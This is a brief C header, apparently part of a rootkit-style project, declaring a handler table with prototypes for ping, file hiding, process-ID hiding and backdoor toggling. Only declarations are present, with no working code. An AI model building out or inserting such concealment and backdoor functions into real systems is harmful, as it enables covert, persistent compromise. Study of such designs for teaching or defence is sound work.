#ifndef _GROUP7_CHANNEL_H
#define _GROUP7_CHANNEL_H

typedef struct {
    const char *name;
    int (*handler)(unsigned long);
} channel_t;

void report_channels(void);
channel_t detect_channel(unsigned);

// handlers
int handle_ping(unsigned long);
int handle_filehide(unsigned long);
int handle_backdoor(unsigned long);
int handle_togglebd(unsigned long);
int handle_hidepid(unsigned long);

#endif//_GROUP7_CHANNEL_H